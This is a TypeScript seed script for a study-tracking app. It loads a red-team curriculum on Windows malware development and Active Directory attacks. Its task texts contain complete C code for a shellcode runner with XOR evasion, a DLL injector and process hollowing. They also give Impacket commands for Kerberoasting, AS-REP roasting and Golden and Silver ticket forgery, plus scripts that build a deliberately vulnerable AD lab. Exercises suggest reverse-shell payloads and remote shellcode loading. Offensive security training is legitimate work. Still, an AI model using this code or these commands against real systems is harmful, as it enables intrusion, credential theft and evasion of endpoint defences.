import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import * as schema from '../src/lib/server/schema';

const sqlite = new Database('data/quest-log.db');

const db = drizzle(sqlite, { schema });

interface TaskData {
	title: string;
	description: string;
	details: string;
}

interface ModuleData {
	name: string;
	description: string;
	tasks: TaskData[];
}

interface PathData {
	name: string;
	description: string;
	language: string;
	color: string;
	skills: string;
	startHint: string;
	difficulty: string;
	estimatedWeeks: number;
	schedule: string;
	modules: ModuleData[];
}

const hackingPath: PathData = {
	name: 'Red Team: Malware Development & Active Directory',
	description: 'A 12-week intensive curriculum for learning offensive security, focusing on custom tooling development and Active Directory attacks. Build custom loaders, C2 frameworks, and master enterprise network exploitation.',
	language: 'C+Python+C#+Rust',
	color: 'red',
	skills: 'Windows internals, Active Directory, malware development, EDR evasion, C2 frameworks, syscalls, Kerberos attacks',
	startHint: 'Start with a basic shellcode runner in C to understand Windows API fundamentals',
	difficulty: 'advanced',
	estimatedWeeks: 12,
	schedule: `## 12-Week Red Team Learning Schedule

### Month 1: Foundations (Weeks 1-4)

#### Week 1-2: Windows Internals & C Fundamentals
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Setup | Install Visual Studio, set up dev environment |
| Tue | Windows API | Study CreateProcess, VirtualAlloc, WriteProcessMemory |
| Wed | Memory | Process memory layout, PE format basics |
| Thu | Shellcode | Write first shellcode runner |
| Fri | Injection | DLL injection via CreateRemoteThread |
| Weekend | Project | Complete process hollowing implementation |

#### Week 3-4: Active Directory Fundamentals
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | AD Setup | Build vulnerable AD home lab |
| Tue | Architecture | Study domains, forests, trusts, GPOs |
| Wed | Kerberos | Understand TGT, TGS, PAC authentication flow |
| Thu | NTLM | Learn NTLM authentication mechanism |
| Fri | Enumeration | Practice with PowerView, BloodHound |
| Weekend | Mapping | Document misconfigurations in lab |

### Month 2: Core Techniques (Weeks 5-8)

#### Week 5-6: Offensive Tooling Development
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Credential Dumper | Build LSASS dump tool |
| Wed-Thu | Encryption | Implement XOR and AES payload encryption |
| Fri | Syscalls | Study direct syscall implementation |
| Weekend | Loader | Build shellcode loader with evasion |

#### Week 7-8: AD Attack Paths
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | BloodHound | Map all paths to Domain Admin |
| Tue | Kerberoasting | Write custom Kerberoasting script |
| Wed | Pass-the-Hash | Implement PTH without Mimikatz |
| Thu | Delegation | Exploit unconstrained delegation |
| Fri | Tickets | Forge Golden Ticket manually |
| Weekend | Chain | Execute full attack chain in lab |

### Month 3: Evasion & Integration (Weeks 9-12)

#### Week 9-10: EDR Evasion
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Hooking | Implement API unhooking |
| Wed-Thu | Syscalls | Add direct/indirect syscalls to loader |
| Fri | ETW | Patch ETW telemetry |
| Weekend | Testing | Test against Defender and Elastic |

#### Week 11-12: Full Chain Operations
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Wed | Integration | Build end-to-end attack chain |
| Thu-Fri | C2 | Complete basic C2 client/server |
| Weekend | Capstone | Full domain compromise with custom tools |

### Daily Commitment: 2-3 hours
### Lab Environment: 32GB RAM, 500GB SSD, VMware/Proxmox`,
	modules: [
		{
			name: 'Windows Internals & Malware Fundamentals',
			description: 'Learn how Windows works under the hood and build your first offensive tools',
			tasks: [
				{
					title: 'Understand Windows API basics and process architecture',
					description: 'Study core Windows APIs used in offensive tools',
					details: `## Windows API Fundamentals

### Core APIs for Offensive Development

**Process Creation and Manipulation:**
- \`CreateProcess\` - Create new processes
- \`VirtualAlloc\` - Allocate memory in process
- \`WriteProcessMemory\` - Write to remote process memory
- \`OpenProcess\` - Get handle to existing process
- \`NtCreateThreadEx\` - Create remote threads

**Memory Operations:**
\`\`\`c
// Example: Allocate memory in remote process
LPVOID remoteBuffer = VirtualAllocEx(
    hProcess,
    NULL,
    sizeof(payload),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

// Write shellcode to remote process
WriteProcessMemory(
    hProcess,
    remoteBuffer,
    payload,
    sizeof(payload),
    NULL
);
\`\`\`

### Process and Thread Architecture

**Process Memory Layout:**
\`\`\`
High Memory
│
├─ Kernel Space (inaccessible from user mode)
│
├─ User Space
│  ├─ Stack (grows downward)
│  ├─ Heap (grows upward)
│  ├─ .data section
│  ├─ .text section (code)
│  └─ DLLs (kernel32, ntdll, etc.)
│
Low Memory
\`\`\`

### PE (Portable Executable) Format

**Key PE Sections:**
- \`.text\` - Executable code
- \`.data\` - Initialized data
- \`.rdata\` - Read-only data
- \`.idata\` - Import table
- \`.reloc\` - Relocation information

**Why PE matters for offensive security:**
- Understanding imports helps identify hooked functions
- Section permissions control code execution
- PE parsing needed for process hollowing
- Import Address Table (IAT) is where hooks occur

### How AV/EDR Detection Works

**Detection Layers:**

1. **Signature-based Detection**
   - Static pattern matching in file
   - YARA rules
   - Hash-based detection

2. **Behavioral Analysis**
   - Monitors API call sequences
   - Process injection detection
   - Suspicious memory allocations

3. **Userland Hooking**
   - EDR hooks ntdll.dll functions
   - Intercepts syscalls before they reach kernel
   - Logs API calls and parameters

### Practice Exercises

- [ ] Use Process Explorer to examine running processes
- [ ] Parse PE headers of common executables
- [ ] Identify hooked functions in ntdll.dll
- [ ] Document common suspicious API sequences`
				},
				{
					title: 'Build a basic shellcode runner',
					description: 'Create your first offensive tool - a simple shellcode execution program',
					details: `## Shellcode Runner Implementation

### What is Shellcode?

Shellcode is position-independent code that performs a specific action (spawn shell, download file, etc.).

### Basic Shellcode Runner

\`\`\`c
#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/exec CMD=calc.exe -f c
unsigned char payload[] =
    "\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52"
    "\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48"
    // ... rest of shellcode
    ;

int main() {
    // Allocate executable memory
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        sizeof(payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (exec_mem == NULL) {
        printf("VirtualAlloc failed: %d\\n", GetLastError());
        return 1;
    }

    // Copy shellcode to allocated memory
    memcpy(exec_mem, payload, sizeof(payload));

    // Cast memory to function pointer and execute
    ((void(*)())exec_mem)();

    return 0;
}
\`\`\`

### Why This Gets Detected

**Detection Points:**
1. \`PAGE_EXECUTE_READWRITE\` - Suspicious memory permission
2. Shellcode in \`.data\` section
3. VirtualAlloc + memcpy + execute pattern
4. No obfuscation of payload

### Improved Version with Basic Evasion

\`\`\`c
#include <windows.h>

// XOR-encrypted payload
unsigned char encrypted_payload[] = { /* XOR encrypted */ };
unsigned char key = 0xAA;

int main() {
    // Allocate RW memory first (less suspicious)
    LPVOID mem = VirtualAlloc(NULL, sizeof(encrypted_payload),
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    for (size_t i = 0; i < sizeof(encrypted_payload); i++) {
        encrypted_payload[i] ^= key;
    }

    // Copy decrypted payload
    memcpy(mem, encrypted_payload, sizeof(encrypted_payload));

    // Change to executable only before execution
    DWORD oldProtect;
    VirtualProtect(mem, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &oldProtect);

    // Execute
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
\`\`\`

### Compilation

\`\`\`bash
# Using MinGW on Linux
x86_64-w64-mingw32-gcc runner.c -o runner.exe

# Using Visual Studio on Windows
cl.exe runner.c /Fe:runner.exe
\`\`\`

### Testing Safely

1. Test in isolated VM
2. Disable antivirus temporarily
3. Use Process Monitor to observe behavior
4. Upload to VirusTotal LAST (hashes get burned)

### Next Steps

- [ ] Implement AES encryption instead of XOR
- [ ] Add sleep timers to evade sandbox
- [ ] Load shellcode from remote server
- [ ] Inject into remote process instead of self`
				},
				{
					title: 'Implement DLL injection via CreateRemoteThread',
					description: 'Build a DLL injector to inject code into remote processes',
					details: `## DLL Injection Technique

### Overview

DLL injection allows you to run your code in another process's address space.

**Use cases:**
- Bypass process-specific protections
- Inject into legitimate processes (living off the land)
- Persist through application restarts

### Classic CreateRemoteThread Method

\`\`\`c
#include <windows.h>
#include <stdio.h>

BOOL InjectDLL(DWORD processId, const char* dllPath) {
    // Open target process with all access
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        processId
    );

    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\\n", GetLastError());
        return FALSE;
    }

    // Allocate memory in target process for DLL path
    SIZE_T dllPathLen = strlen(dllPath) + 1;
    LPVOID remoteDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteDllPath == NULL) {
        printf("VirtualAllocEx failed: %d\\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, remoteDllPath, dllPath, dllPathLen, NULL)) {
        printf("WriteProcessMemory failed: %d\\n", GetLastError());
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Get address of LoadLibraryA in kernel32.dll
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    if (loadLibraryAddr == NULL) {
        printf("GetProcAddress failed\\n");
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create remote thread that calls LoadLibraryA with our DLL path
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)loadLibraryAddr,
        remoteDllPath,
        0,
        NULL
    );

    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\\n", GetLastError());
        VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Wait for injection to complete
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, remoteDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("DLL injected successfully!\\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <PID> <DLL_PATH>\\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];

    InjectDLL(pid, dllPath);

    return 0;
}
\`\`\`

### Example Payload DLL

\`\`\`c
// payload.c - Simple message box DLL
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
            MessageBoxA(NULL, "Injected!", "DLL Injection", MB_OK);
            break;
    }
    return TRUE;
}
\`\`\`

**Compile payload DLL:**
\`\`\`bash
x86_64-w64-mingw32-gcc -shared payload.c -o payload.dll
\`\`\`

### Why This Method Gets Detected

**EDR Detection Points:**
1. \`OpenProcess\` with \`PROCESS_ALL_ACCESS\` on suspicious process
2. \`VirtualAllocEx\` + \`WriteProcessMemory\` pattern
3. \`CreateRemoteThread\` API call
4. Loading DLL from suspicious location

### Alternative: Manual Mapping

Manual mapping loads DLL without calling LoadLibrary, bypassing DLL load notifications:

\`\`\`c
// Steps for manual mapping:
// 1. Parse PE headers of DLL
// 2. Allocate memory in target process
// 3. Copy sections to target process
// 4. Resolve imports manually
// 5. Fix relocations
// 6. Call DllMain via CreateRemoteThread
\`\`\`

### Detection Evasion Improvements

- Use \`NtCreateThreadEx\` instead of \`CreateRemoteThread\`
- Implement threadless injection (no new thread)
- Module stomping (overwrite legitimate DLL)
- Use direct syscalls to bypass EDR hooks

### Practice Exercises

- [ ] Inject DLL into notepad.exe
- [ ] Build payload DLL that spawns reverse shell
- [ ] Enumerate running processes to find injection targets
- [ ] Implement error handling and cleanup`
				},
				{
					title: 'Build process hollowing implementation',
					description: 'Implement process hollowing to execute malicious code in legitimate process',
					details: `## Process Hollowing (RunPE)

### Concept

Process hollowing creates a suspended legitimate process, replaces its code with malicious payload, then resumes execution.

**Advantages:**
- Malicious code appears as legitimate process
- Bypasses application whitelisting
- Evades some security monitoring

### Implementation Steps

1. Create target process in suspended state
2. Unmap original executable from memory
3. Allocate new memory for malicious payload
4. Write malicious payload to process
5. Set entry point to payload
6. Resume process thread

### Complete Implementation

\`\`\`c
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL ProcessHollow(const char* targetPath, unsigned char* payload, SIZE_T payloadSize) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Step 1: Create target process in suspended state
    if (!CreateProcessA(
        targetPath,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("CreateProcess failed: %d\\n", GetLastError());
        return FALSE;
    }

    printf("[+] Created suspended process (PID: %d)\\n", pi.dwProcessId);

    // Step 2: Get target process image base address
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID imageBaseAddress;
    ReadProcessMemory(
        pi.hProcess,
        (PVOID)(ctx.Rdx + 0x10),  // PEB + 0x10 = ImageBaseAddress
        &imageBaseAddress,
        sizeof(PVOID),
        NULL
    );

    printf("[+] Image base address: 0x%p\\n", imageBaseAddress);

    // Step 3: Unmap original executable
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    NtUnmapViewOfSection(pi.hProcess, imageBaseAddress);
    printf("[+] Unmapped original image\\n");

    // Step 4: Parse payload PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS ntHeaders =
        (PIMAGE_NT_HEADERS)(payload + dosHeader->e_lfanew);

    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID preferredBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;

    // Step 5: Allocate memory for payload in target process
    PVOID newImageBase = VirtualAllocEx(
        pi.hProcess,
        preferredBase,
        imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (newImageBase == NULL) {
        // Try allocating at any address if preferred base fails
        newImageBase = VirtualAllocEx(
            pi.hProcess,
            NULL,
            imageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    printf("[+] Allocated memory at: 0x%p\\n", newImageBase);

    // Step 6: Write PE headers
    if (!WriteProcessMemory(
        pi.hProcess,
        newImageBase,
        payload,
        ntHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        printf("Failed to write headers\\n");
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    // Step 7: Write sections
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(
            pi.hProcess,
            (PVOID)((LPBYTE)newImageBase + sectionHeader[i].VirtualAddress),
            (PVOID)((LPBYTE)payload + sectionHeader[i].PointerToRawData),
            sectionHeader[i].SizeOfRawData,
            NULL
        );
    }

    printf("[+] Wrote payload sections\\n");

    // Step 8: Update PEB with new image base
    WriteProcessMemory(
        pi.hProcess,
        (PVOID)(ctx.Rdx + 0x10),
        &newImageBase,
        sizeof(PVOID),
        NULL
    );

    // Step 9: Set new entry point
    ctx.Rcx = (DWORD64)((LPBYTE)newImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    printf("[+] Updated entry point to: 0x%llx\\n", ctx.Rcx);

    // Step 10: Resume execution
    ResumeThread(pi.hThread);
    printf("[+] Process resumed\\n");

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target.exe> <payload.exe>\\n", argv[0]);
        return 1;
    }

    // Read payload file
    FILE* f = fopen(argv[2], "rb");
    fseek(f, 0, SEEK_END);
    SIZE_T payloadSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* payload = (unsigned char*)malloc(payloadSize);
    fread(payload, 1, payloadSize, f);
    fclose(f);

    ProcessHollow(argv[1], payload, payloadSize);

    free(payload);
    return 0;
}
\`\`\`

### Testing

\`\`\`bash
# Compile
x86_64-w64-mingw32-gcc hollow.c -o hollow.exe

# Test with calc.exe as target and your payload
hollow.exe "C:\\Windows\\System32\\calc.exe" payload.exe
\`\`\`

### Detection & Evasion

**How EDR detects this:**
- Process created in suspended state
- NtUnmapViewOfSection calls
- Memory written to suspended process
- Entry point modifications

**Evasion techniques:**
- Use direct syscalls instead of API calls
- Implement transacted hollowing
- Use process doppelgänging
- Add legitimate operations before hollowing

### Advanced Variations

**Transacted Hollowing:**
- Uses NTFS transactions
- Writes malicious payload to transaction
- Loads into memory before committing
- Transaction never commits (file doesn't touch disk)

### Resources

- ired.team process hollowing guide
- Hasherezade's process doppelgänging research
- Study EDR telemetry to understand detection`
				}
			]
		},
		{
			name: 'Active Directory Fundamentals',
			description: 'Build and understand Active Directory environments before attacking them',
			tasks: [
				{
					title: 'Build vulnerable Active Directory home lab',
					description: 'Set up a realistic AD environment with intentional misconfigurations',
					details: `## Active Directory Lab Setup

### Minimum Hardware Requirements

- **RAM:** 32GB (64GB recommended)
- **Storage:** 500GB SSD
- **Hypervisor:** VMware Workstation, Proxmox, or Hyper-V

### Network Topology

\`\`\`
┌─────────────────────────────────────────────────────────────┐
│                    Internal Network                          │
│                      10.0.0.0/24                             │
│                                                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐          │
│  │    DC01     │  │    WS01     │  │    WS02     │          │
│  │ Win Srv 2022│  │  Windows 11 │  │  Windows 10 │          │
│  │  10.0.0.10  │  │  10.0.0.20  │  │  10.0.0.21  │          │
│  │             │  │             │  │             │          │
│  │ - AD DS     │  │ - Domain    │  │ - Domain    │          │
│  │ - DNS       │  │   joined    │  │   joined    │          │
│  │ - ADCS      │  │ - Defender  │  │ - "IT Admin"│          │
│  └─────────────┘  │   enabled   │  │   logged in │          │
│                   └─────────────┘  └─────────────┘          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
                            │
                    ┌───────┴───────┐
                    │   ATTACKER    │
                    │  Kali/Ubuntu  │
                    │  10.0.0.100   │
                    └───────────────┘
\`\`\`

### VM Build Order

#### 1. Domain Controller (DC01)

**OS:** Windows Server 2022 Evaluation
**Resources:** 4GB RAM, 60GB disk

**Initial Setup:**
\`\`\`powershell
# Set static IP
New-NetIPAddress -IPAddress 10.0.0.10 -PrefixLength 24 -InterfaceAlias "Ethernet"
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.0.0.10

# Install AD DS
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest \\
    -DomainName "lab.local" \\
    -DomainNetbiosName "LAB" \\
    -ForestMode "WinThreshold" \\
    -DomainMode "WinThreshold" \\
    -InstallDns \\
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) \\
    -Force

# Reboot happens automatically
\`\`\`

#### 2. Workstation 1 (WS01)

**OS:** Windows 11 Evaluation
**Resources:** 4GB RAM, 60GB disk

\`\`\`powershell
# Set DNS to DC
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.0.0.10

# Join domain
Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
\`\`\`

#### 3. Workstation 2 (WS02)

**OS:** Windows 10 Evaluation
**Resources:** 4GB RAM, 60GB disk
**Setup:** Same as WS01

#### 4. Attacker Machine

**OS:** Kali Linux or Ubuntu
**Resources:** 4GB RAM, 80GB disk

\`\`\`bash
# Set static IP
sudo ip addr add 10.0.0.100/24 dev eth0
sudo ip route add default via 10.0.0.1

# Install tools
sudo apt update
sudo apt install -y \\
    bloodhound \\
    neo4j \\
    crackmapexec \\
    impacket-scripts \\
    responder \\
    evil-winrm \\
    smbclient \\
    ldapsearch
\`\`\`

### Creating Vulnerable Configurations

**On DC01 as Domain Admin:**

\`\`\`powershell
# Create vulnerable users
New-ADUser -Name "SQL Service" -SamAccountName "svc_sql" \\
    -AccountPassword (ConvertTo-SecureString "SQLService123!" -AsPlainText -Force) \\
    -Enabled $true \\
    -PasswordNeverExpires $true

# Make it Kerberoastable
setspn -A MSSQLSvc/db01.lab.local:1433 svc_sql

# Create AS-REP roastable user
New-ADUser -Name "ASREP User" -SamAccountName "asrep_user" \\
    -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) \\
    -Enabled $true
Set-ADAccountControl -Identity "asrep_user" -DoesNotRequirePreAuth $true

# Create user with weak ACLs
New-ADUser -Name "ACL Abuse" -SamAccountName "acl_user" \\
    -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) \\
    -Enabled $true

# Give low-priv user DCSync rights (intentionally vulnerable)
Add-ADGroupMember -Identity "Domain Admins" -Members "acl_user"
# Or for more subtle: Set-ADObject with DS-Replication rights

# Enable unconstrained delegation on WS01
Get-ADComputer WS01 | Set-ADObject -Replace @{"userAccountControl"=532480}

# Create admin account with SPN (doubly vulnerable)
New-ADUser -Name "Admin SPN" -SamAccountName "admin_svc" \\
    -AccountPassword (ConvertTo-SecureString "Admin123!" -AsPlainText -Force) \\
    -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "admin_svc"
setspn -A HTTP/admin.lab.local admin_svc
\`\`\`

### Install ADCS (Certificate Services)

\`\`\`powershell
# On DC01
Install-WindowsFeature ADCS-Cert-Authority -IncludeManagementTools
Install-AdcsCertificationAuthority \\
    -CAType EnterpriseRootCA \\
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" \\
    -KeyLength 2048 \\
    -HashAlgorithmName SHA256 \\
    -ValidityPeriod Years \\
    -ValidityPeriodUnits 10 \\
    -Force

# Create vulnerable certificate template (ESC1)
# Use Certificate Templates MMC to create template with:
# - Client Authentication EKU
# - Enrollee supplies subject
# - Domain Users can enroll
\`\`\`

### Snapshot Strategy

| Snapshot Name | When to Take |
|---------------|--------------|
| \`DC01-clean\` | After AD promotion, before misconfigs |
| \`DC01-vulnerable\` | After all misconfigurations created |
| \`WS01-joined\` | After domain join, before attacks |
| \`attacker-tooled\` | After all tools installed |
| \`LAB-baseline\` | All VMs ready, before any attack testing |

### Validation Checklist

- [ ] All machines can ping each other
- [ ] DNS resolution works (nslookup lab.local)
- [ ] Domain authentication works
- [ ] BloodHound can collect data
- [ ] Kerberoastable accounts exist
- [ ] AS-REP roastable account exists
- [ ] ADCS is configured

### Lab Maintenance

**Reset to clean state:**
\`\`\`bash
# Revert all VMs to baseline snapshot
vmware-vim-cmd vmsvc/snapshot.revert <vmid> <snapshot_id>
\`\`\`

**Useful lab scripts:**
\`\`\`powershell
# Create bulk users for practice
1..50 | ForEach-Object {
    $user = "user$_"
    New-ADUser -Name $user -SamAccountName $user \\
        -AccountPassword (ConvertTo-SecureString "Password$_" -AsPlainText -Force) \\
        -Enabled $true
}
\`\`\`

### Resources

- [GOAD (Game of Active Directory)](https://github.com/Orange-Cyberdefense/GOAD) - Pre-built vulnerable AD lab
- [DetectionLab](https://github.com/clong/DetectionLab) - Security monitoring lab
- [BadBlood](https://github.com/davidprowe/BadBlood) - Populate AD with complex relationships`
				},
				{
					title: 'Understand Kerberos authentication flow',
					description: 'Master Kerberos protocol to effectively attack it',
					details: `## Kerberos Authentication Deep Dive

### Why Kerberos Matters

Kerberos is the default authentication protocol in Active Directory. Understanding it is essential because:
- Most AD attacks target Kerberos
- Golden/Silver tickets manipulate Kerberos tokens
- Kerberoasting exploits service tickets
- Pass-the-ticket attacks reuse Kerberos credentials

### Kerberos Authentication Flow

\`\`\`
┌─────────┐                                  ┌─────────────┐
│  User   │                                  │     KDC     │
│ (Client)│                                  │(Domain      │
│         │                                  │ Controller) │
└────┬────┘                                  └──────┬──────┘
     │                                              │
     │ 1. AS-REQ (Authentication Service Request)  │
     │    Username + Encrypted timestamp            │
     ├─────────────────────────────────────────────>│
     │                                              │
     │                                              │ [Verify user]
     │                                              │ [Check password]
     │                                              │
     │ 2. AS-REP (Authentication Service Reply)    │
     │    TGT (Ticket Granting Ticket)              │
     │    + Session key                             │
     │<─────────────────────────────────────────────┤
     │                                              │
     │                                              │
     │ 3. TGS-REQ (Ticket Granting Service Request)│
     │    TGT + SPN of target service               │
     ├─────────────────────────────────────────────>│
     │                                              │
     │                                              │ [Verify TGT]
     │                                              │ [Create service ticket]
     │                                              │
     │ 4. TGS-REP (Ticket Granting Service Reply)  │
     │    Service Ticket                            │
     │<─────────────────────────────────────────────┤
     │                                              │
     │                                              │
     ▼                                              │
┌──────────────┐                                   │
│   Service    │                                   │
│ (e.g., SQL)  │                                   │
└──────┬───────┘                                   │
       │                                           │
       │ 5. AP-REQ (Application Request)           │
       │    Service Ticket                         │
       │<──────────────────────────────────────────┘
       │
       │ [Decrypt ticket]
       │ [Verify user]
       │
       │ 6. AP-REP (Application Reply)
       │    Authentication success
       │
\`\`\`

### Detailed Step Breakdown

#### Step 1: AS-REQ (Authentication Service Request)

**What client sends:**
- Username
- Domain name
- Encrypted timestamp (encrypted with hash of user's password)

**Python representation:**
\`\`\`python
as_req = {
    "username": "alice",
    "realm": "LAB.LOCAL",
    "timestamp": encrypt_with_password_hash(current_time)
}
\`\`\`

#### Step 2: AS-REP (Authentication Service Reply)

**What KDC sends:**
- **TGT (Ticket Granting Ticket)** - Encrypted with KDC's secret key (krbtgt hash)
- **Session key** - For client to use with TGS
- **Encrypted with user's password hash**

**TGT Contents:**
\`\`\`python
tgt = {
    "username": "alice",
    "realm": "LAB.LOCAL",
    "session_key": <random_key>,
    "expiration": <8_hours_from_now>,
    "PAC": {  # Privilege Attribute Certificate
        "user_groups": ["Domain Users", "Sales"],
        "user_rights": [...],
        "signature": <signed_by_kdc>
    }
}
# Entire TGT encrypted with krbtgt password hash
\`\`\`

#### Step 3: TGS-REQ (Request Service Ticket)

**Client sends:**
- The TGT (from step 2)
- SPN (Service Principal Name) of target service
- Authenticator (timestamp + client info) encrypted with session key

\`\`\`python
tgs_req = {
    "tgt": <encrypted_ticket>,
    "spn": "MSSQLSvc/db01.lab.local:1433",
    "authenticator": encrypt_with_session_key({
        "username": "alice",
        "timestamp": current_time
    })
}
\`\`\`

#### Step 4: TGS-REP (Service Ticket Granted)

**KDC sends:**
- **Service Ticket** - Encrypted with service account's password hash
- **Service session key**

\`\`\`python
service_ticket = {
    "username": "alice",
    "spn": "MSSQLSvc/db01.lab.local:1433",
    "session_key": <random_key>,
    "expiration": <8_hours>,
    "PAC": <user_privileges>
}
# Encrypted with svc_sql password hash
\`\`\`

#### Step 5-6: Service Authentication

Client presents service ticket to the target service. Service decrypts with its own password hash and verifies the PAC.

### Key Kerberos Concepts

**Ticket Types:**

| Ticket | Encrypted With | Purpose |
|--------|----------------|---------|
| **TGT** | krbtgt hash | Proves user identity to KDC |
| **Service Ticket** | Service account hash | Access specific service |
| **Golden Ticket** | Forged TGT (needs krbtgt hash) | Full domain access |
| **Silver Ticket** | Forged Service Ticket (needs service hash) | Access specific service |

**SPN (Service Principal Name):**
- Format: \`ServiceClass/Host:Port\`
- Examples:
  - \`HTTP/web01.lab.local\`
  - \`MSSQLSvc/db01.lab.local:1433\`
  - \`CIFS/fileserver.lab.local\`

**PAC (Privilege Attribute Certificate):**
- Contains user's group memberships
- Signed by KDC
- Prevents ticket tampering
- Attack vector: MS14-068 allowed forging PAC

### Attack Vectors

#### Kerberoasting

Extract service tickets and crack offline:
\`\`\`bash
# Request service ticket for all SPNs
impacket-GetUserSPNs lab.local/user:password -dc-ip 10.0.0.10 -request

# Crack extracted tickets
hashcat -m 13100 tickets.txt wordlist.txt
\`\`\`

**Why it works:** Service tickets encrypted with service account password, which may be weak.

#### AS-REP Roasting

Users with "Do not require Kerberos preauthentication" enabled leak encrypted material:
\`\`\`bash
impacket-GetNPUsers lab.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt
\`\`\`

#### Golden Ticket

Forge TGT with krbtgt hash:
\`\`\`bash
# Requires: krbtgt NTLM hash, Domain SID
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain lab.local administrator
export KRB5CCNAME=administrator.ccache
\`\`\`

**Power:** Unlimited domain access, tickets valid until krbtgt password changes (usually never).

#### Silver Ticket

Forge service ticket:
\`\`\`bash
# Requires: Service account hash, SPN, Domain SID
impacket-ticketer -nthash <svc_hash> -domain-sid <sid> -domain lab.local \\
    -spn CIFS/fileserver.lab.local administrator
\`\`\`

**Use case:** Stealthy access to single service without touching KDC.

### Practice Exercises

- [ ] Capture Kerberos traffic with Wireshark, identify each step
- [ ] Request TGT using kinit, examine ticket with klist
- [ ] Manually perform Kerberoasting with Rubeus or Impacket
- [ ] Draw the Kerberos flow from memory
- [ ] Explain how AS-REP roasting works to someone non-technical

### Deep Dive Resources

